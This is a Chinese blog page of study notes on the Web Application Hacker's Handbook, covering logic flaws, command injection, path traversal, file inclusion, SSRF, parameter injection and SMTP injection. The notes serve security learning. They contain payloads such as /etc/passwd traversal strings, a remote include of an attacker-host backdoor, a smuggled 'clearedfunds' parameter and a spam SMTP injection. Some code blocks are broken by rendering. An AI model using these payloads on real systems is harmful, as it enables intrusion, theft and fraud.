<h6 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h6><p>不提供原密码修改任意用户密码。（这个外包应该很便宜。）</p>
<p>hack steps：当处理关键功能的逻辑时，尝试分别移除每个参数。</p>
<h5 id="Proceeding-to-checkout"><a href="#Proceeding-to-checkout" class="headerlink" title="Proceeding to checkout"></a>Proceeding to checkout</h5><h6 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h6><p>购物 APP 流程：</p>
<ol>
<li>把商品添加到购物车</li>
<li>回到购物车，完成订单</li>
<li>确认支付信息</li>
<li>确认物流信息</li>
</ol>
<h6 id="假设-2"><a href="#假设-2" class="headerlink" title="假设"></a>假设</h6><p>开发人员假设用户总是按照以上步骤访问应用。</p>
<h6 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h6><p>攻击者可以直接从步骤 2 跳到步骤 4</p>
<p>hack steps：当多阶段功能有预定义的顺序时，尝试打乱顺序。</p>
<h5 id="自己开保险"><a href="#自己开保险" class="headerlink" title="自己开保险"></a>自己开保险</h5><h6 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h6><p>保险流程：</p>
<ol>
<li>申请人提供个人信息，应用根据信息计算保额。</li>
<li>通过多个阶段，申报人提供了大量个人信息。</li>
<li>最后，申请书转交给保险公司，保险公司决定是否接受。</li>
</ol>
<h6 id="假设-3"><a href="#假设-3" class="headerlink" title="假设"></a>假设</h6><p>开发人员假设用户只会提交程序要求提交的数据，没有考虑假如用户额外提交数据会怎样。</p>
<h6 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h6><ul>
<li>可以提交前一阶段已经校验过的 key，有可能不再校验，注入恶意信息</li>
<li>在之后的阶段提交新的收入信息，可以提高额度</li>
<li>如果没有区分申请人和审核人的权限，申请人猜到同意申请的接口，就可以自己审核了</li>
</ul>
<p>hack steps：</p>
<ul>
<li>多阶段功能要尝试</li>
<li>多个角色要尝试</li>
</ul>
<h5 id="银行破产"><a href="#银行破产" class="headerlink" title="银行破产"></a>银行破产</h5><h6 id="功能-4"><a href="#功能-4" class="headerlink" title="功能"></a>功能</h6><p>银行应用的注册过程：</p>
<ol>
<li>上传个人信息：姓名 住址 生日等</li>
<li>给用户邮寄包裹，包含账户激活的信息</li>
<li>激活账户</li>
</ol>
<h6 id="假设-4"><a href="#假设-4" class="headerlink" title="假设"></a>假设</h6><p>设计思路是没问题的，问题在代码实现上。</p>
<p>注册的后端代码：获取个人信息并校验后，new 一个实例存储该信息，获取用户独立编号，存储该实例</p>
<h6 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h6><p>相同的实例也用在了其他地方，比如，显示用户信息。</p>
<ol>
<li>使用有效账户登录</li>
<li>使用注册功能，提交他人信息，攻击者的实例被受害者的实例覆盖</li>
<li>攻击者此时可以访问受害者的账户</li>
</ol>
<p>hack steps</p>
<ol>
<li>在一个设计水平和垂直权限的复杂应用中，寻找会话中和单个用户身份有关的实例</li>
<li>尝试单步执行某个功能，然后切换到一个不相关的功能，确定是否有影响。</li>
</ol>
<h5 id="打破商业限制"><a href="#打破商业限制" class="headerlink" title="打破商业限制"></a>打破商业限制</h5><h6 id="功能-5"><a href="#功能-5" class="headerlink" title="功能"></a>功能</h6><p>财务人员可以在公司的不同账户进行转账。为了防止欺诈，大多数用户不允许进行超过 10000 美元的转账。</p>
<h6 id="假设-5"><a href="#假设-5" class="headerlink" title="假设"></a>假设</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bool CAuthCheck::RequiresApproval(int amount)</span><br><span class="line">&#123;</span><br><span class="line">    if (amount &lt;&#x3D; m_apprThreshold)</span><br><span class="line">        return false;</span><br><span class="line">    else return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开发人员假设这个代码没问题。</p>
<h6 id="攻击-5"><a href="#攻击-5" class="headerlink" title="攻击"></a>攻击</h6><p>可以传入一个负数。</p>
<h5 id="折扣欺诈"><a href="#折扣欺诈" class="headerlink" title="折扣欺诈"></a>折扣欺诈</h5><h6 id="功能-6"><a href="#功能-6" class="headerlink" title="功能"></a>功能</h6><p>应用程序允许用户购买软件产品，并且，如果购买合适的捆绑项目，就可以获得折扣。</p>
<h6 id="假设-6"><a href="#假设-6" class="headerlink" title="假设"></a>假设</h6><p>当用户把一个软件添加到购物车时，应用会根据规则来决定当前选择的产品是否有权享受折扣。如果满足规则，购物车内的产品价格会根据折扣进行调整。开发者假设用户将继续购买选中的捆绑项目，因此有权享受折扣。</p>
<h6 id="攻击-6"><a href="#攻击-6" class="headerlink" title="攻击"></a>攻击</h6><p>开发者的假设是错误的，因为用户可以从购物车移除商品。假如移除商品后，价格没响应改变，就出问题了。</p>
<h5 id="对转义字符进行转义操作"><a href="#对转义字符进行转义操作" class="headerlink" title="对转义字符进行转义操作"></a>对转义字符进行转义操作</h5><h6 id="功能-7"><a href="#功能-7" class="headerlink" title="功能"></a>功能</h6><p>为了防止操作系统命令注入，开发者决定对以下字符进行转义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; | &amp; &lt; &gt; ‘ space and newline</span><br></pre></td></tr></table></figure>

<h6 id="假设-7"><a href="#假设-7" class="headerlink" title="假设"></a>假设</h6><p>开发者觉得这样就万无一失了。</p>
<h6 id="攻击-7"><a href="#攻击-7" class="headerlink" title="攻击"></a>攻击</h6><p>输入前</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo\;ls</span><br></pre></td></tr></table></figure>

<p>转义后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo\\;ls</span><br></pre></td></tr></table></figure>

<p>防御失败。</p>
<h5 id="使输入验证无效"><a href="#使输入验证无效" class="headerlink" title="使输入验证无效"></a>使输入验证无效</h5><h6 id="功能-8"><a href="#功能-8" class="headerlink" title="功能"></a>功能</h6><p>防 SQL 注入功能：把每个单引号前加一个单引号，就可以对单引号进行转义</p>
<p>长度限制：输入不能超过 128 个字符，之后的字符进行截断</p>
<h6 id="假设-8"><a href="#假设-8" class="headerlink" title="假设"></a>假设</h6><p>假设没问题</p>
<h6 id="攻击-8"><a href="#攻击-8" class="headerlink" title="攻击"></a>攻击</h6><p>输入 127个 a 加一个 单引号，该单引号就先转义，后被截断</p>
<p>输入密码解决引号不匹配问题</p>
<p>不进行迭代的过滤器都是有问题的！</p>
<h5 id="滥用搜索功能"><a href="#滥用搜索功能" class="headerlink" title="滥用搜索功能"></a>滥用搜索功能</h5><h6 id="功能-9"><a href="#功能-9" class="headerlink" title="功能"></a>功能</h6><p>应用提供了大量信息，其中某些信息仅限于付费用户。同时，该应用还提供了搜索功能，所有用户都可以使用。搜索结果包含付费文档的链接。</p>
<h6 id="假设-9"><a href="#假设-9" class="headerlink" title="假设"></a>假设</h6><p>应用假设用户仅通过搜索结果不能访问付费信息。</p>
<h6 id="攻击-9"><a href="#攻击-9" class="headerlink" title="攻击"></a>攻击</h6><p>因为搜索会返回匹配的数量，可以使用如下方法来探测付费文档的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">wahh consulting</span><br><span class="line">&gt;&gt; 276 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; merger</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; share issue</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; dividend</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover</span><br><span class="line">&gt;&gt; 1 match</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover haxors inc</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover uberleet ltd</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover script kiddy corp</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover ngs</span><br><span class="line">&gt;&gt; 1 match</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover ngs announced</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover ngs cancelled</span><br><span class="line">&gt;&gt; 0 matches</span><br><span class="line">wahh consulting &quot;Press Release 08-03-2011&quot; takeover ngs completed</span><br><span class="line">&gt;&gt; 1 match</span><br></pre></td></tr></table></figure>

<p>假如密码明文存储了，此时就可以枚举到密码了。</p>
<h5 id="捕捉调试信息"><a href="#捕捉调试信息" class="headerlink" title="捕捉调试信息"></a>捕捉调试信息</h5><h6 id="功能-10"><a href="#功能-10" class="headerlink" title="功能"></a>功能</h6><p>应用上线不久，还有很多功能性 bug，因此，程序员增加了调试信息。</p>
<h6 id="假设-10"><a href="#假设-10" class="headerlink" title="假设"></a>假设</h6><p>程序员假设用户看到调试信息也不会有安全问题。</p>
<h6 id="攻击-10"><a href="#攻击-10" class="headerlink" title="攻击"></a>攻击</h6><p>存放调试信息的网页是静态的，是会话无关的。由于实现的不安全，用户偶尔会看到其他用户的调试信息。</p>
<p>攻击者可以多次尝试制造错误，收集其他用户的信息。</p>
<h5 id="Racing-Against-the-Login"><a href="#Racing-Against-the-Login" class="headerlink" title="Racing Against the Login"></a>Racing Against the Login</h5><h6 id="功能-11"><a href="#功能-11" class="headerlink" title="功能"></a>功能</h6><p>多阶段登录功能。</p>
<h6 id="假设-11"><a href="#假设-11" class="headerlink" title="假设"></a>假设</h6><p>认为没问题了。</p>
<h6 id="攻击-11"><a href="#攻击-11" class="headerlink" title="攻击"></a>攻击</h6><p>线程不安全，假设多个用户同时登录，可能会对不上号。</p>
<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/01/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91/" data-id="ckc3hqpmb0000kofec9ky5ce1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第十章：攻击后端组件" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/27/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%90%8E%E7%AB%AF%E7%BB%84%E4%BB%B6/" class="article-date">
  <time datetime="2020-06-27T03:15:51.970Z" itemprop="datePublished">2020-06-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/27/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%90%8E%E7%AB%AF%E7%BB%84%E4%BB%B6/">Web 应用黑客手册/第十章：攻击后端组件</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击后端组件"><a href="#攻击后端组件" class="headerlink" title="攻击后端组件"></a>攻击后端组件</h3><h4 id="系统命令注入"><a href="#系统命令注入" class="headerlink" title="系统命令注入"></a>系统命令注入</h4><p>一般出现在定制的 Web 应用中，比如防火墙设备，这种设备一般需要执行直接和操作系统交互的命令</p>
<h5 id="动态执行注入"><a href="#动态执行注入" class="headerlink" title="动态执行注入"></a>动态执行注入</h5><p>很多脚本语言支持代码运行时动态执行。PHP 中的 exec 函数就可以动态执行代码。</p>
<h5 id="寻找-OS-注入漏洞"><a href="#寻找-OS-注入漏洞" class="headerlink" title="寻找 OS 注入漏洞"></a>寻找 OS 注入漏洞</h5><p>在映射应用的时候，根据功能判断出需要进行系统交互的 URL。</p>
<p>有两类元字符：</p>
<ul>
<li>; | &amp; 换行符  主要用于命令批处理</li>
<li>` </li>
</ul>
<p>很多时候，命令的执行结果并不会直接返回，测试是否有漏洞的最好方法是使用时延命令。</p>
<p>Hack steps</p>
<ol>
<li>换着花样使用 ping，测试是否存在命令注入漏洞</li>
<li>测试 ls 或者 dir 之类有返回结果的命令，看网页是否有返回</li>
<li>如果不能直接获取返回结果，可以考虑反向 shell，或者把返回结果写到文件再访问</li>
<li>确定用户的权限</li>
</ol>
<p>如果有注入漏洞，但是命令被禁止，无法形成有效攻击，可以使用类似 nslookup 的命令</p>
<p>nslookup 查询失败会把域名打印出来，可以把脚本作为输入参数，把输出重定向到其他脚本文件，然后访问该文件。</p>
<p>如果不允许使用空格，在类 UNIX 系统中，可以使用 $IFS 代替。</p>
<h5 id="寻找动态执行漏洞"><a href="#寻找动态执行漏洞" class="headerlink" title="寻找动态执行漏洞"></a>寻找动态执行漏洞</h5><p>动态执行漏洞多出现在 PHP 和 perl 程序中。</p>
<p>hack steps</p>
<ol>
<li>任何用户提供的参数都可能是动态执行代码的一部分，尤其是服务器写的 cookie 参数。（我猜是过于信任 cookie 的安全）</li>
<li>输入 echo 命令</li>
<li>查看返回中是否有步骤 2 中 echo 输出的信息</li>
<li>查看是否有由于步骤 2 导致的错误信息，调整步骤 2</li>
<li>如果是 PHP 应用，可以考虑 phpinfo() 函数</li>
<li>如果确有漏洞，使用 system() 执行系统命令</li>
</ol>
<h5 id="防止系统命令注入"><a href="#防止系统命令注入" class="headerlink" title="防止系统命令注入"></a>防止系统命令注入</h5><p>最好不要直接调用系统命令，实际上，应用中的任何功能都可以通过 API 实现。</p>
<p>如果不可避免，就考虑白名单，限制字符集。</p>
<p>执行命令使用命令 API 而不是传入字符串给 shell 执行。</p>
<h5 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h5><p>最好不要把用户的输入传入动态执行函数中。不可避免的场景下，使用白名单。</p>
<h4 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h4><p>有很多功能都需要把用户输入的参数当作文件名或目录名。</p>
<h5 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h5><p>路径遍历漏洞：应用使用用户控制的数据访问文件或目录，处理不当，会导致用户可以访问敏感信息。</p>
<h5 id="寻找路径遍历漏洞"><a href="#寻找路径遍历漏洞" class="headerlink" title="寻找路径遍历漏洞"></a>寻找路径遍历漏洞</h5><h6 id="定位攻击目标"><a href="#定位攻击目标" class="headerlink" title="定位攻击目标"></a>定位攻击目标</h6><p>任何涉及上传和下载文件的功能都要认真对待。在相关参数插入 / \ 进行测试。</p>
<h6 id="定位路径遍历漏洞"><a href="#定位路径遍历漏洞" class="headerlink" title="定位路径遍历漏洞"></a>定位路径遍历漏洞</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;foo&#x2F;file1.txt</span><br><span class="line">file&#x3D;foo&#x2F;bar&#x2F;..&#x2F;file1.txt</span><br></pre></td></tr></table></figure>

<p>如果依然正确返回，说明有戏</p>
<p>继续尝试访问操作系统公共文件</p>
<h6 id="规避障碍"><a href="#规避障碍" class="headerlink" title="规避障碍"></a>规避障碍</h6><p>hack steps，绕过 / \ 限制</p>
<ol>
<li><p>尝试使用两种斜线 / \ ，很多文件系统两种都支持</p>
</li>
<li><p>使用 URL 编码</p>
</li>
<li><p>使用 UTF-16 编码</p>
</li>
<li><p>双重 URL 编码</p>
</li>
<li><p>UTF-8 编码</p>
</li>
<li><pre><code>....//
....\/
..../\
....\\
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hack steps 绕过文件类型限制</span><br><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure>
../../../../../boot.ini%00.jpg
java 允许字符串中包含 null
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
检查路径开始于特定子目录，容易绕过
filestore/../../../../../../../etc/passwd
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">###### 处理自定义编码</span><br><span class="line"></span><br><span class="line">##### 利用路径遍历漏洞</span><br><span class="line"></span><br><span class="line">hack steps</span><br><span class="line"></span><br><span class="line">读权限：</span><br><span class="line"></span><br><span class="line">- 密码文件</span><br><span class="line">- 应用配置文件</span><br><span class="line">- 可能包含数据库凭证的 include 文件</span><br><span class="line">- 应用使用的数据文件，包括数据库文件，xml 文件</span><br><span class="line">- 源代码</span><br><span class="line">- 日志文件</span><br><span class="line"></span><br><span class="line">写权限：</span><br><span class="line"></span><br><span class="line">- 各种脚本</span><br><span class="line"></span><br><span class="line">##### 防止路径遍历漏洞</span><br><span class="line"></span><br><span class="line">尽量不要把用户的参数当作路径；如果不可避免，如果检测的非法字符，拒绝该请求。</span><br><span class="line"></span><br><span class="line">##### 文件包含漏洞</span><br><span class="line"></span><br><span class="line">PHP 包含文件</span><br><span class="line"></span><br><span class="line">###### 远程文件包含</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">https:&#x2F;&#x2F;wahh-app.com&#x2F;main.php?Country&#x3D;US</span><br><span class="line">$country &#x3D; $_GET[‘Country’];</span><br><span class="line">include( $country . ‘.php’ );</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;wahh-app.com&#x2F;main.php?Country&#x3D;http:&#x2F;&#x2F;wahh-attacker.com&#x2F;backdoor</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ol>
<h6 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h6><ul>
<li>包含高权限可执行代码</li>
<li>包含静态文件</li>
</ul>
<h5 id="寻找文件包含漏洞"><a href="#寻找文件包含漏洞" class="headerlink" title="寻找文件包含漏洞"></a>寻找文件包含漏洞</h5><p>远程文件包含漏洞</p>
<ol>
<li>参数替换成自己可以控制的 URL</li>
<li>参数替换成非法 URL，观察是否出现延时</li>
<li>如果出现文件包含漏洞，上传恶意脚本</li>
</ol>
<p>本地文件包含漏洞</p>
<ol>
<li>上传已知名字的本地可执行文件</li>
<li>上传已知名字的静态资源文件</li>
<li>尝试获取敏感信息</li>
<li>尝试之前的路径遍历</li>
</ol>
<h4 id="注入-XML"><a href="#注入-XML" class="headerlink" title="注入 XML"></a>注入 XML</h4><p>现在还用？不都在用 json ？ </p>
<h4 id="注入后端-HTTP-请求"><a href="#注入后端-HTTP-请求" class="headerlink" title="注入后端 HTTP 请求"></a>注入后端 HTTP 请求</h4><ul>
<li>Server-Side Request Forgery ：SSRF 可以使用户访问任意资源</li>
<li>HTTP parameter injection (HPI) ：攻击者可以注入任意参数到后端 HTTP 请求中</li>
</ul>
<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>这种场景通常如下：需要把几种不同的后端应用组合起来共同提供服务，联系这些后端组件的组件就是 Front End，FE 接收到客户端的消息后，通过 HTTP 和几种不同的后端服务交互。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /account/home HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: wahh-blogs.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">view=default&amp;loc=online.wahh-blogs.net/css/wahh.css</span><br></pre></td></tr></table></figure>

<p>以上请求中，假如对 loc 参数不做校验，就会导致 SSRF 漏洞。</p>
<p>hack steps</p>
<ol>
<li>鉴别包含域名的请求参数</li>
<li>修改参数，观察返回结果</li>
<li>把参数指定为自己控制的服务器，看是否会访问</li>
<li>根绝时延判断</li>
<li>如果确认可用，进行以下操作：指定端口号，内网端口扫描，尝试连接其他服务，产生跨站脚本攻击</li>
</ol>
<h5 id="HPI"><a href="#HPI" class="headerlink" title="HPI"></a>HPI</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 客户端请求</span><br><span class="line">POST &#x2F;bank&#x2F;48&#x2F;Default.aspx HTTP&#x2F;1.0</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 65</span><br><span class="line">FromAccount&#x3D;18281008&amp;Amount&#x3D;1430&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit</span><br><span class="line">&#x2F;&#x2F; 后端请求，用于验证请求</span><br><span class="line">POST &#x2F;doTransfer.asp HTTP&#x2F;1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 44</span><br><span class="line">fromacc&#x3D;18281008&amp;amount&#x3D;1430&amp;toacc&#x3D;08447656</span><br><span class="line">&#x2F;&#x2F; 修改后的看客户端请求，此时不再验证</span><br><span class="line">POST &#x2F;bank&#x2F;48&#x2F;Default.aspx HTTP&#x2F;1.0</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 96</span><br><span class="line"></span><br><span class="line">FromAccount&#x3D;18281008&amp;Amount&#x3D;1430&amp;ToAccount&#x3D;08447656%26clearedfunds%3dtrue</span><br><span class="line">&amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>后端注入需要对该后端有了解，但是，一般是不可能的。除非，该后端是第三方组件，可以白盒审计。</p>
<h4 id="注入邮件服务"><a href="#注入邮件服务" class="headerlink" title="注入邮件服务"></a>注入邮件服务</h4><h5 id="邮件头伪造"><a href="#邮件头伪造" class="headerlink" title="邮件头伪造"></a>邮件头伪造</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 本来</span><br><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-mail.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn&#39;t load</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可以向任意 wahh-othercompany.com 域下的用户发邮件</span><br><span class="line">To: admin@wahh-app.com</span><br><span class="line">From: marcus@wahh-mail.com</span><br><span class="line">Bcc: all@wahh-othercompany.com</span><br><span class="line">Subject: Site problem</span><br><span class="line"></span><br><span class="line">Confirm Order page doesn&#39;t load</span><br></pre></td></tr></table></figure>

<h5 id="SMTP-命令注入"><a href="#SMTP-命令注入" class="headerlink" title="SMTP 命令注入"></a>SMTP 命令注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 本来</span><br><span class="line">MAIL FROM: daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br><span class="line">&#x2F;&#x2F; 注入</span><br><span class="line">MAIL FROM: daf@wahh-mail.com</span><br><span class="line">RCPT TO: feedback@wahh-app.com</span><br><span class="line">DATA</span><br><span class="line">From: daf@wahh-mail.com</span><br><span class="line">To: feedback@wahh-app.com</span><br><span class="line">Subject: Site+feedback</span><br><span class="line">foo</span><br><span class="line">.</span><br><span class="line">MAIL FROM: mail@wahh-viagra.com</span><br><span class="line">RCPT TO: john@wahh-mail.com</span><br><span class="line">DATA</span><br><span class="line">From: mail@wahh-viagra.com</span><br><span class="line">To: john@wahh-mail.com</span><br><span class="line">Subject: Cheap V1AGR4</span><br><span class="line">Blah</span><br><span class="line">.</span><br><span class="line">foo</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>SMTP 中，. 竟然是分隔符。</p>
<h5 id="寻找-SMTP-注入漏洞"><a href="#寻找-SMTP-注入漏洞" class="headerlink" title="寻找 SMTP 注入漏洞"></a>寻找 SMTP 注入漏洞</h5><p>在可疑位置注入</p>
<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/27/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%90%8E%E7%AB%AF%E7%BB%84%E4%BB%B6/" data-id="ckbxqp6ey0005rsfe2bvch8sh" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第九章：攻击数据存储" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B9%9D%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" class="article-date">
  <time datetime="2020-06-26T12:37:32.889Z" itemprop="datePublished">2020-06-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B9%9D%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/">Web 应用黑客手册/第九章：攻击数据存储</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击数据存储"><a href="#攻击数据存储" class="headerlink" title="攻击数据存储"></a>攻击数据存储</h3><h4 id="注入解释上下文"><a href="#注入解释上下文" class="headerlink" title="注入解释上下文"></a>注入解释上下文</h4><p>任何语言都可以注入，解释性语言容易一些。混淆数据和代码的边界。</p>
